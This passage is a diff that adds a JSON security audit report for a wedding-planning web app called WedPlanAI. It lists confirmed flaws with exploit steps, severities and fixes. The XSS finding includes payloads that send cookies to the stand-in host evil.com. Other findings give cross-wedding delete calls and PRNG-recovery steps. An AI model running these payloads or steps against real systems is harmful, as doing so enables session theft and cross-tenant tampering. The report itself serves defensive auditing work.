@@ -1,0 +1,904 @@
+{
+  "$schema": "file:///C:/Users/AVASA/.agents/skills/security-audit/report-schema.json",
+  "audit_info": {
+    "project": "WedPlanAI",
+    "date": "24-Jun-2026",
+    "methodology": "Cloudflare Security Audit Skill — multi-agent adversarial analysis",
+    "phases": ["reconnaissance", "hunting", "validation"],
+    "attack_classes_covered": [
+      "injection", "access_control", "cryptography",
+      "business_logic", "feature_abuse", "obvious_things", "wildcard"
+    ]
+  },
+  "findings": [
+    {
+      "verdict": "confirmed",
+      "title": "Stored CSS Injection leading to XSS via DynamicTheme dangerouslySetInnerHTML",
+      "description": "The DynamicTheme component in src/components/theme/DynamicTheme.tsx renders theme color values (themePrimary, themeSecondary, themeBackground, themeDarkPrimary, themeDarkSecondary, themeDarkBackground, and their showcase equivalents) into a <style> block via dangerouslySetInnerHTML with zero sanitization. Any authenticated user can submit a malicious color value containing </style><script> to achieve stored XSS. The server-side endpoints (updateWeddingAppearanceAction and PUT /api/v1/wedding) store these values as-is without validation. There are no CSP headers configured in next.config.ts.",
+      "root_cause": "DynamicTheme in src/components/theme/DynamicTheme.tsx does not sanitize interpolated color values before rendering them in a dangerouslySetInnerHTML style block, allowing script injection via closing style tags.",
+      "intended_behavior": "Allow users to customize wedding theme colors (primary, secondary, background, dark mode equivalents) through the Appearance settings page and REST API.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/wedding.ts",
+          "line": 458,
+          "scope": "updateWeddingAppearanceAction",
+          "description": "Accepts data.themePrimary and other color fields from the Appearance form, stores directly into DB with no sanitization"
+        },
+        {
+          "kind": "entrypoint",
+          "file": "src/app/api/v1/wedding/route.ts",
+          "line": 88,
+          "scope": "PUT handler",
+          "description": "Accepts themePrimary and other color fields via REST API, stored directly via updates[field] = body[field] with no validation"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/db/schema.ts",
+          "line": 0,
+          "scope": "wedding table",
+          "description": "Theme color values stored as-is in the wedding table columns"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/components/dashboard/appearance/AppearanceFormClient.tsx",
+          "line": 183,
+          "scope": "render",
+          "description": "Client-side pattern=\"^#[0-9A-Fa-f]{6}$\" validation only — trivially bypassed via curl or disabled JS"
+        },
+        {
+          "kind": "sink",
+          "file": "src/components/theme/DynamicTheme.tsx",
+          "line": 65,
+          "scope": "component render",
+          "description": "Interpolates primary into :root { --color-primary: ${primary} } inside dangerouslySetInnerHTML without sanitization — contrast with font values which ARE sanitized at line 38"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires authenticated session (admin) or valid API key — any authenticated user can exploit"
+        },
+        {
+          "kind": "system_configuration",
+          "description": "No Content-Security-Policy headers configured in next.config.ts — no defense-in-depth"
+        },
+        {
+          "kind": "data_state",
+          "description": "Color values must contain </style> to break out of the CSS context — any string containing this sequence works"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Authenticated admin user with access to Appearance settings, or API key holder with access to PUT /api/v1/wedding.",
+        "payloads": [
+          "{\"themePrimary\": \"</style><script>fetch('https://evil.com/steal?c='+document.cookie)</script><style>\"}",
+          "{\"themePrimary\": \"</style><script>new Image().src='https://evil.com/steal?c='+document.cookie</script><style>\"}"
+        ],
+        "instructions": [
+          "1. Authenticate as admin user or obtain valid API key",
+          "2. Send PUT request to /api/v1/wedding with malformed themePrimary field",
+          "3. Any user visiting a page that renders DynamicTheme (dashboard, showcase) executes the injected script"
+        ],
+        "expected_result": "JavaScript executes in the context of every visitor's browser session on any page that includes DynamicTheme. Attacker can steal cookies, exfiltrate page content, or perform actions on behalf of the victim."
+      },
+      "remediation": {
+        "strategy": "Add server-side regex validation for color fields (^#[0-9A-Fa-f]{6}$ or named colors), add CSP headers in next.config.ts, and sanitize output in DynamicTheme by encoding HTML special characters in interpolated values.",
+        "code_changes": [
+          {
+            "file_name": "src/components/theme/DynamicTheme.tsx",
+            "fixed_code": "const sanitizeColor = (val: string | null | undefined, fallback: string) => {\n  if (!val || !/^#[0-9A-Fa-f]{6}$|^[a-zA-Z]+$/.test(val)) return fallback;\n  return val;\n};"
+          },
+          {
+            "file_name": "next.config.ts",
+            "fixed_code": "async headers() {\n  return [{\n    source: '/(.*)',\n    headers: [{ key: 'Content-Security-Policy', value: \"default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'\" }]\n  }];\n}"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "high",
+          "reason": "Any authenticated user (admin or API key) can exploit; no sanitization exists on any layer; exploit payload is trivial"
+        },
+        "impact": {
+          "score": "critical",
+          "reason": "Full XSS — attacker can steal session cookies, exfiltrate data, perform actions as victim, deface showcase pages for all visitors"
+        },
+        "overall_severity": "critical"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed at every link in the chain (entrypoint → storage → render → sink). No sanitization found. Contrast with font sanitization at line 38 proves the pattern was considered but not applied to colors."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "API Key Global Scope on Traditions and Categories Endpoints",
+      "description": "The four API route files for traditions and categories (GET/POST /api/v1/traditions, PUT/DELETE /api/v1/traditions/[id], GET/POST /api/v1/categories, PUT/DELETE /api/v1/categories/[id]) all call validateApiKey(request) but never use the returned auth.weddingId. Any valid API key — regardless of which wedding it was generated for — has full read, create, update, and delete access to all global tradition and category configuration affecting all weddings.",
+      "root_cause": "Traditions and categories API route handlers in src/app/api/v1/traditions/ and src/app/api/v1/categories/ do not enforce authorization beyond key validity, allowing any API key to modify global configuration.",
+      "intended_behavior": "Traditions and categories are global seed data intended to be managed by administrators. The API should require admin role elevation or a separate permissions check for these endpoints.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/api/v1/traditions/route.ts",
+          "line": 20,
+          "scope": "GET handler",
+          "description": "Calls validateApiKey(request), checks if (!auth) for existence only — never uses auth.weddingId"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/api/v1/traditions/route.ts",
+          "line": 38,
+          "scope": "POST handler",
+          "description": "Same pattern — validates key exists but no scope check before inserting into wedding_trad_config (global table)"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/api/v1/categories/route.ts",
+          "line": 18,
+          "scope": "GET handler",
+          "description": "Same pattern — validates key exists, no scope check"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/api/v1/traditions/[id]/route.ts",
+          "line": 15,
+          "scope": "DELETE handler",
+          "description": "Same pattern — deletes global tradition by ID with only key-validity check"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires any valid (non-expired) API key"
+        },
+        {
+          "kind": "authorization_role",
+          "description": "No role or scope check — any key from any wedding works"
+        },
+        {
+          "kind": "data_state",
+          "description": "Tables have no weddingId column — truly global, so scoping by weddingId is impossible without schema change"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Any person or script with a valid API key (e.g., a disgruntled employee whose key is scoped to wedding A).",
+        "payloads": [
+          "DELETE /api/v1/traditions/some-global-tradition-id",
+          "POST /api/v1/categories with body: { key: 'malicious', name: 'Injected Category', followUpQuestions: [] }"
+        ],
+        "instructions": [
+          "1. Obtain any valid API key (wp_live_*) — e.g., from accessing the API Keys page on your own wedding dashboard",
+          "2. Call any traditions or categories endpoint with x-api-key header",
+          "3. Read, create, update, or delete global configuration affecting all weddings"
+        ],
+        "expected_result": "Global tradition and category data can be corrupted or destroyed by any API key holder. All weddings using these defaults are affected."
+      },
+      "remediation": {
+        "strategy": "Add an authorization guard requiring admin role or a separate global-config permission before allowing mutations on traditions/categories. Consider adding a createdBy column for audit trail.",
+        "code_changes": [
+          {
+            "file_name": "src/app/api/v1/auth-helper.ts",
+            "fixed_code": "Add a requireAdminScope(auth) helper that checks the API key's user role"
+          },
+          {
+            "file_name": "src/app/api/v1/traditions/route.ts",
+            "fixed_code": "Add admin check before POST handler: if (auth.role !== 'admin') return new Response(JSON.stringify({ error: 'Admin access required' }), { status: 403 })"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "high",
+          "reason": "Every API key grants this access — there is no admin-only restriction. Any developer, team member, or automated script with a valid key can exploit."
+        },
+        "impact": {
+          "score": "high",
+          "reason": "Global configuration corruption affects all weddings using the platform. Traditions control ceremony seeding, categories control task organization — both are foundational to the wedding creation flow."
+        },
+        "overall_severity": "critical"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed in all 4 route files. Tables confirmed to have no weddingId column. No middleware or wrapper adds scope checks."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "Math.random() Used for Guest Login Code Generation",
+      "description": "Guest login codes (6-character alphanumeric strings used as authentication tokens for the guest RSVP flow) are generated using Math.floor(Math.random() * chars.length) instead of crypto.randomBytes(). Math.random() in V8 uses the xorshift128+ PRNG which is not cryptographically secure — an attacker who observes a few generated outputs can recover the internal state and predict future codes.",
+      "root_cause": "Guest code generation functions in src/db/schema.ts, src/app/actions/guests.ts use Math.random() instead of crypto.randomBytes(), producing predictable authentication tokens.",
+      "intended_behavior": "Generate random, unpredictable 6-character login codes so that only invited guests can access the RSVP page for a specific wedding.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/db/schema.ts",
+          "line": 188,
+          "scope": "guest.loginCode $defaultFn",
+          "description": "Generates default loginCode using Math.floor(Math.random() * chars.length) when inserting new guests via DB schema default"
+        },
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/guests.ts",
+          "line": 34,
+          "scope": "createGuestAction",
+          "description": "Also generates login code with Math.random() for single guest creation"
+        },
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/guests.ts",
+          "line": 184,
+          "scope": "batchInsertGuestsAction",
+          "description": "Also generates login code with Math.random() for bulk CSV import"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/actions/guests.ts",
+          "line": 238,
+          "scope": "findGuestByCodeAction",
+          "description": "Validates the guest login code — no rate limiting on this public endpoint"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "No authentication required — findGuestByCodeAction is a public server action"
+        },
+        {
+          "kind": "timing_dependency",
+          "description": "PRNG state recovery requires observing multiple generated outputs, possible via the error oracle (Finding 6)"
+        },
+        {
+          "kind": "system_configuration",
+          "description": "No rate limiting anywhere (Finding 7) — brute-force is unbounded"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "External attacker with no credentials who wants to access a specific wedding's guest RSVP data.",
+        "payloads": [
+          "Repeated calls to findGuestByCodeAction with different code guesses",
+          "PRNG state recovery script using the V8 xorshift128+ algorithm"
+        ],
+        "instructions": [
+          "1. Observe several guest codes (e.g., via the error oracle or by creating test guests)",
+          "2. Recover the xorshift128+ internal state using the V8 PRNG recovery algorithm",
+          "3. Predict future guest codes or brute-force existing ones with no rate limit throttling"
+        ],
+        "expected_result": "Valid guest codes can be predicted or brute-forced. A valid code grants access to the guest's RSVP page (name, dietary restrictions, invited ceremonies, plusOne count) and ability to submit RSVP."
+      },
+      "remediation": {
+        "strategy": "Replace Math.random() with crypto.randomBytes() for all guest code generation. Use crypto.randomBytes(3).toString('hex') for 6 hex chars or crypto.randomInt(36) per character.",
+        "code_changes": [
+          {
+            "file_name": "src/db/schema.ts",
+            "fixed_code": "$defaultFn: () => crypto.randomBytes(3).toString('hex').slice(0, 6)"
+          },
+          {
+            "file_name": "src/app/actions/guests.ts",
+            "fixed_code": "const loginCode = crypto.randomBytes(3).toString('hex').slice(0, 6);"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "medium",
+          "reason": "Requires PRNG state recovery which is technically challenging but well-documented for V8. No rate limiting makes brute-force feasible."
+        },
+        "impact": {
+          "score": "critical",
+          "reason": "Guest codes are the sole authentication mechanism for the RSVP flow — a compromised code allows reading guest PII (name, dietary info) and submitting RSVP responses fraudulently."
+        },
+        "overall_severity": "critical"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed at all three generation sites. No cryptographic RNG usage found anywhere in the guest code flow."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "TOCTOU Race Condition on Signup — Multiple Admin Creation",
+      "description": "The signupAction in src/app/actions/auth.ts checks for existing users with a SELECT query and then creates a new user with auth.api.signUpEmail() in separate await calls without any transaction or lock. Two simultaneous requests can both see zero existing users and both create admin accounts.",
+      "root_cause": "signupAction in src/app/actions/auth.ts does not wrap the first-user check and user creation in a transaction or advisory lock, allowing concurrent requests to both pass the check.",
+      "intended_behavior": "Only the first user to sign up should become an admin; subsequent signups should be rejected with 'Public registration is closed.'",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/auth.ts",
+          "line": 20,
+          "scope": "signupAction",
+          "description": "SELECT * FROM users LIMIT 1 — checks if any user exists (first-user check)"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/auth.ts",
+          "line": 25,
+          "scope": "signupAction",
+          "description": "auth.api.signUpEmail({ body: { name, email, password, persona } }) — creates the new user (non-atomic with check above)"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/auth.ts",
+          "line": 38,
+          "scope": "signupAction",
+          "description": "db.update(users).set({ role: 'admin' }) — promotes the new user to admin"
+        },
+        {
+          "kind": "sink",
+          "file": "src/db/schema.ts",
+          "line": 7,
+          "scope": "user table",
+          "description": "UNIQUE constraint only on email — different emails pass freely. No unique constraint on role or 'single admin' guard."
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "timing_dependency",
+          "description": "Two requests must arrive simultaneously while the users table is empty (before any first user is created)"
+        },
+        {
+          "kind": "data_state",
+          "description": "Only exploitable during the window between app deployment and first successful signup"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Two users racing to create the first account, or a developer testing signup flow under load.",
+        "payloads": [
+          "POST /api/v1/auth/register (or signup form) with email: user1@example.com",
+          "POST /api/v1/auth/register (or signup form) with email: user2@example.com",
+          "Sent simultaneously via parallel request tool"
+        ],
+        "instructions": [
+          "1. Deploy fresh instance with empty database",
+          "2. Send two signup requests simultaneously with different emails",
+          "3. Both users are created and both are promoted to admin role"
+        ],
+        "expected_result": "Two admin users exist in the system when only one was intended."
+      },
+      "remediation": {
+        "strategy": "Wrap the check+insert in a Drizzle transaction with serializable isolation level. Use pg_try_advisory_lock() as a distributed mutex around the first-user check.",
+        "code_changes": [
+          {
+            "file_name": "src/app/actions/auth.ts",
+            "fixed_code": "Use db.transaction with SELECT ... FOR UPDATE or pg_try_advisory_lock() around the entire check-and-create flow"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "low",
+          "reason": "Requires precise timing during the narrow window when the users table is empty. After the first admin is created, all subsequent signups are rejected."
+        },
+        "impact": {
+          "score": "high",
+          "reason": "Multiple admin accounts created — each with full system access. Admin accounts can delete data, modify config, access all weddings."
+        },
+        "overall_severity": "high"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Source code confirmed. Check (SELECT) and insert (signUpEmail) are clearly separated await calls. No transaction, lock, or unique constraint prevents concurrent bypass."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "Missing weddingId Scope Check on UPDATE/DELETE Server Actions",
+      "description": "Several kanban and guest server actions update or delete database records by primary key only, without adding a WHERE weddingId = authenticatedWeddingId clause. An authenticated user from Wedding A can modify or delete resources belonging to Wedding B by guessing or enumerating UUIDs.",
+      "root_cause": "UPDATE and DELETE server actions in src/app/actions/kanban.ts and src/app/actions/guests.ts do not join or filter by authenticated weddingId, allowing cross-wedding resource manipulation.",
+      "intended_behavior": "Users should only be able to modify resources scoped to their own authenticated wedding. Create actions correctly call getActiveWedding() but update/delete actions skip this check.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/kanban.ts",
+          "line": 61,
+          "scope": "updateColumnAction",
+          "description": "eq(kanbanColumns.id, columnId) — no weddingId filter"
+        },
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/kanban.ts",
+          "line": 90,
+          "scope": "deleteColumnAction",
+          "description": "eq(kanbanColumns.id, columnId) — no weddingId filter"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/kanban.ts",
+          "line": 113,
+          "scope": "reorderColumnsAction",
+          "description": "eq(kanbanColumns.id, columnIds[i]) — no weddingId filter"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/kanban.ts",
+          "line": 258,
+          "scope": "deleteTaskAction",
+          "description": "eq(tasks.id, taskId) — no weddingId filter"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/kanban.ts",
+          "line": 303,
+          "scope": "updateTaskAction",
+          "description": "eq(tasks.id, taskId) — no weddingId filter"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/guests.ts",
+          "line": 71,
+          "scope": "updateGuestRSVPAction",
+          "description": "eq(guests.id, guestId) — no weddingId filter"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/guests.ts",
+          "line": 90,
+          "scope": "deleteGuestAction",
+          "description": "eq(guests.id, guestId) — no weddingId filter"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/actions/guests.ts",
+          "line": 155,
+          "scope": "batchInsertGuestsAction",
+          "description": "Takes weddingId from caller with zero ownership validation — insert guests into any wedding"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires authenticated session (valid login)"
+        },
+        {
+          "kind": "authorization_role",
+          "description": "Any authenticated user from any wedding can exploit — no role restriction"
+        },
+        {
+          "kind": "data_state",
+          "description": "Attacker must know or guess the target resource UUID — but these are sequential/predictable in some patterns"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Authenticated user with access to Wedding A who wants to disrupt Wedding B.",
+        "payloads": [
+          "deleteTaskAction('task-uuid-from-wedding-B')",
+          "updateGuestAction('guest-uuid-from-wedding-B', { name: 'Hacked Name' })"
+        ],
+        "instructions": [
+          "1. Log in as a user from any wedding",
+          "2. Obtain a resource UUID from another wedding (e.g., via guest enumeration or if UUIDs are predictable)",
+          "3. Call the corresponding update/delete action with the foreign UUID"
+        ],
+        "expected_result": "Resource from Wedding B is modified or deleted by a user from Wedding A."
+      },
+      "remediation": {
+        "strategy": "Every UPDATE and DELETE action must first resolve the authenticated weddingId via getActiveWedding() and add it to the WHERE clause. Create actions already do this — the pattern exists.",
+        "code_changes": [
+          {
+            "file_name": "src/app/actions/kanban.ts",
+            "fixed_code": "Add const activeWedding = await getActiveWedding(session.user.id); before UPDATE/DELETE queries and add eq(kanbanColumns.weddingId, activeWedding.weddingId)"
+          },
+          {
+            "file_name": "src/app/actions/guests.ts",
+            "fixed_code": "Add const activeWedding = await getActiveWedding(session.user.id); before UPDATE/DELETE queries and add eq(guests.weddingId, activeWedding.weddingId)"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "low",
+          "reason": "Requires attacker to know resource UUIDs from other weddings. However, the complete absence of scope checks means any discovered UUID is immediately exploitable."
+        },
+        "impact": {
+          "score": "high",
+          "reason": "Data corruption and deletion across weddings. Tasks, columns, guests, and RSVPs can be modified or destroyed by any authenticated user."
+        },
+        "overall_severity": "high"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Each function's WHERE clause confirmed in source. The contrast with create actions (which DO scope-check) makes this an established pattern violation, not an accidental omission."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "Guest Code Error Oracle — Enumeration via Distinct Messages",
+      "description": "The findGuestByCodeAction in src/app/actions/guests.ts returns three distinct error messages depending on why a guest code lookup failed: 'Invalid login code' (code not found), 'This code is for a different wedding' (code exists for another wedding), or 'Failed to verify login code' (server error). An attacker can probe whether a specific code is valid by trying it against different wedding IDs.",
+      "root_cause": "findGuestByCodeAction in src/app/actions/guests.ts returns distinct error messages for different failure conditions, allowing attackers to distinguish between 'code not found' and 'code belongs to another wedding'.",
+      "intended_behavior": "Provide helpful error messages to legitimate guests who may have mistyped their code or clicked the wrong wedding link.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/guests.ts",
+          "line": 248,
+          "scope": "findGuestByCodeAction",
+          "description": "Returns 'Invalid login code. Please check your invitation.' when code is not found in any wedding"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/guests.ts",
+          "line": 253,
+          "scope": "findGuestByCodeAction",
+          "description": "Returns 'This code is for a different wedding.' when code exists but belongs to a different wedding"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/components/public-rsvp-form.tsx",
+          "line": 122,
+          "scope": "setError(res.error)",
+          "description": "Error message rendered directly to the user via setError"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "No authentication required — public server action"
+        },
+        {
+          "kind": "system_configuration",
+          "description": "No rate limiting anywhere (Finding 7) — unlimited probing"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "External attacker with no credentials.",
+        "payloads": [
+          "findGuestByCodeAction({ loginCode: 'XXXXXX', weddingId: 'wedding-A' })",
+          "findGuestByCodeAction({ loginCode: 'XXXXXX', weddingId: 'wedding-B' })"
+        ],
+        "instructions": [
+          "1. Generate candidate guest code 'XXXXXX'",
+          "2. Call findGuestByCodeAction with wedding A — if 'Invalid login code' → code doesn't exist",
+          "3. Call with wedding B — if 'This code is for a different wedding' → code IS valid for some wedding"
+        ],
+        "expected_result": "Attacker can determine which guest codes are valid by trying each candidate against multiple wedding IDs."
+      },
+      "remediation": {
+        "strategy": "Return a uniform error message for all failure conditions. Log the actual error server-side for debugging.",
+        "code_changes": [
+          {
+            "file_name": "src/app/actions/guests.ts",
+            "fixed_code": "Return 'Invalid or expired invitation code.' for all error paths (code not found, wrong wedding, server error)"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "medium",
+          "reason": "No rate limiting makes enumeration feasible. Distinct messages provide clear oracle signal."
+        },
+        "impact": {
+          "score": "medium",
+          "reason": "Valid code enumeration enables targeted attacks. Each valid code grants access to guest PII and RSVP functionality."
+        },
+        "overall_severity": "medium"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "All three error messages confirmed in source code at exact lines. The rendering path confirmed in the public RSVP form component."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "No Rate Limiting — Systemic",
+      "description": "No rate limiting exists anywhere in the codebase. No library dependency (express-rate-limit, @upstash/ratelimit), no middleware, no helper function, no bucket/leaky-bucket algorithm. Every API route, server action, and public endpoint is unprotected against rapid-fire calls.",
+      "root_cause": "The application has no rate limiting mechanism at any layer — no middleware, no library, no custom implementation.",
+      "intended_behavior": "No rate limiting was implemented — this is a missing security control rather than a bug.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "package.json",
+          "line": 0,
+          "scope": "dependencies",
+          "description": "No rate-limiting library present (@upstash/ratelimit, express-rate-limit, etc.)"
+        },
+        {
+          "kind": "propagation",
+          "file": "next.config.ts",
+          "line": 8,
+          "scope": "configuration",
+          "description": "Has bodySizeLimit: '50mb' but no rate limiting configuration"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/api/v1/auth-helper.ts",
+          "line": 0,
+          "scope": "validateApiKey",
+          "description": "Validates API key against DB but no rate limiting or cooldown"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/actions/guests.ts",
+          "line": 238,
+          "scope": "findGuestByCodeAction",
+          "description": "Public server action — no rate limiting, multiplies Findings 3 and 6"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "system_configuration",
+          "description": "No rate limiting control exists at any layer of the application"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Any attacker, authenticated or anonymous.",
+        "payloads": [
+          "Repeated POST /api/v1/wedding requests to exhaust DB connections",
+          "Rapid-fire findGuestByCodeAction calls for brute-force guest code enumeration",
+          "Concurrent signup requests for TOCTOU exploitation"
+        ],
+        "instructions": [
+          "1. Choose any public or authenticated endpoint",
+          "2. Send requests at maximum speed — no throttling, no rate limit responses (429)"
+        ],
+        "expected_result": "Unlimited request rate. Brute-force attacks feasible. Potential resource exhaustion."
+      },
+      "remediation": {
+        "strategy": "Add @upstash/ratelimit or express-rate-limit for API routes. Implement server-side throttling for public server actions. Apply stricter limits to auth endpoints and guest code lookup.",
+        "code_changes": [
+          {
+            "file_name": "package.json",
+            "fixed_code": "\"@upstash/ratelimit\": \"^2.0.0\", \"@upstash/redis\": \"^1.0.0\""
+          },
+          {
+            "file_name": "src/app/api/v1/auth-helper.ts",
+            "fixed_code": "Add rateLimit check before key validation: const { success } = await ratelimit.limit(auth.weddingId || ip)"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "medium",
+          "reason": "Any attacker can exploit — no authentication required for public endpoints. The complete absence of rate limiting is trivially exploitable."
+        },
+        "impact": {
+          "score": "medium",
+          "reason": "Systemic issue that multiplies the risk of every other finding (guest code brute-force, TOCTOU, error oracle, DoS). Alone, enables resource exhaustion."
+        },
+        "overall_severity": "medium"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Exhaustive search confirmed zero rate limiting — no library, no middleware, no custom implementation anywhere in the codebase."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "Past Wedding Date Accepted via REST API",
+      "description": "The POST /api/v1/wedding and PUT /api/v1/wedding endpoints accept any date string without validating that the wedding date is in the future. The Zod-validated server action (wedding.ts:16-18) does enforce a future-date check with z.string().refine(val => new Date(val) > new Date()), but the REST API routes bypass this entirely.",
+      "root_cause": "API route handlers in src/app/api/v1/wedding/route.ts do not validate that weddingDate is in the future, while the server action does — creating an inconsistent validation gap.",
+      "intended_behavior": "Weddings should require a future date to prevent creating weddings with past dates.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/api/v1/wedding/route.ts",
+          "line": 146,
+          "scope": "POST handler",
+          "description": "Only checks if (!weddingDate) for existence — no future-date validation"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/api/v1/wedding/route.ts",
+          "line": 156,
+          "scope": "POST handler",
+          "description": "Bare new Date(weddingDate) conversion with no validity check"
+        },
+        {
+          "kind": "sink",
+          "file": "src/app/api/v1/wedding/route.ts",
+          "line": 85,
+          "scope": "PUT handler",
+          "description": "body[field] ? new Date(body[field]) : null — no date validity check at all"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires valid API key (POST) or session (PUT)"
+        },
+        {
+          "kind": "data_state",
+          "description": "Any date string is accepted — past, present, or malformed"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "API key holder or authenticated user.",
+        "payloads": [
+          "POST /api/v1/wedding with weddingDate: '2020-01-01'"
+        ],
+        "instructions": [
+          "1. Obtain valid API key",
+          "2. POST /api/v1/wedding with weddingDate set to any past date",
+          "3. Wedding is created with the past date — no validation error"
+        ],
+        "expected_result": "Wedding with a past date is created successfully."
+      },
+      "remediation": {
+        "strategy": "Add Zod schema validation to API routes, reusing the same validation logic as the server action (z.string().refine(val => new Date(val) > new Date())).",
+        "code_changes": [
+          {
+            "file_name": "src/app/api/v1/wedding/route.ts",
+            "fixed_code": "Add: if (weddingDate && new Date(weddingDate) <= new Date()) { return errorResponse('Wedding date must be in the future', 400); }"
+          }
+        ]
+      },
+      "severity": {
+        "likelihood": {
+          "score": "low",
+          "reason": "Requires deliberate action with valid credentials — unlikely to be accidentally exploited"
+        },
+        "impact": {
+          "score": "low",
+          "reason": "Data integrity issue — a wedding with a past date may cause UI display issues but no security breach"
+        },
+        "overall_severity": "medium"
+      },
+      "confidence": {
+        "score": "high",
+        "reason": "Code confirmed at all three locations. The server action has the check at wedding.ts:16-18 — the API route lacks it entirely."
+      }
+    },
+    {
+      "verdict": "confirmed",
+      "title": "CSV Guest Import — No Batch Limit and Negative Numbers Accepted",
+      "description": "The batchInsertGuestsAction processes all CSV rows without a batch size limit. It also performs N individual SELECT queries for login-code uniqueness checks (N+1 pattern). The plusOneCount field accepts negative values because parseInt('-5') || 0 evaluates to -5 (the || 0 only catches NaN, not negative numbers).",
+      "root_cause": "batchInsertGuestsAction in src/app/actions/guests.ts does not cap the number of rows, performs individual SELECT queries per row instead of a batch check, and does not guard against negative plusOneCount values.",
+      "intended_behavior": "Allow admin users to import guests from CSV efficiently and safely.",
+      "trace": [
+        {
+          "kind": "entrypoint",
+          "file": "src/app/actions/guests.ts",
+          "line": 176,
+          "scope": "batchInsertGuestsAction",
+          "description": "Loops over all parsed CSV rows with no batch size limit"
+        },
+        {
+          "kind": "propagation",
+          "file": "src/app/actions/guests.ts",
+          "line": 188,
+          "scope": "batchInsertGuestsAction",
+          "description": "Individual SELECT per row for login-code uniqueness — N+1 DB round trips"
+        },
+        {
+          "kind": "sink",
+          "file": "src/components/dashboard/guests/csv-upload.tsx",
+          "line": 65,
+          "scope": "csv parse",
+          "description": "parseInt(guest.plusOneCount) || 0 — '-5' || 0 evaluates to -5, negative value persisted"
+        }
+      ],
+      "conditions": [
+        {
+          "kind": "authentication_level",
+          "description": "Requires authenticated session with access to the wedding"
+        }
+      ],
+      "execution": {
+        "attacker_perspective": "Authenticated admin user with access to guest import.",
+        "payloads": [
+          "CSV with 10000 rows (no batch limit)",
+          "CSV with plusOneCount: -5 (negative number accepted)"
+        ],
+        "instructions": [
+          "1. Upload CSV with 10000+ guest rows via CSV import",
+          "2. All rows are processed with N+1 SELECT queries — potential timeout or resource exhaustion",
+          "3. Include a row with plusOneCount=-5 — value is stored as negative"
+        ],
+        "expected_result": "No rejection of oversized batches. Negative plusOneCount stored in database."
+      },
+      "remediation": {
+        "strategy": "Add batch size limit (max 500 rows). Use DB-level uniqueness constraint instead of per-row SELECT. Guard with Math.max(0, ...) or z.number().min(0).",
+        "code_changes": [
+          {
+            "file_name": "src/app/actions/guests.ts",
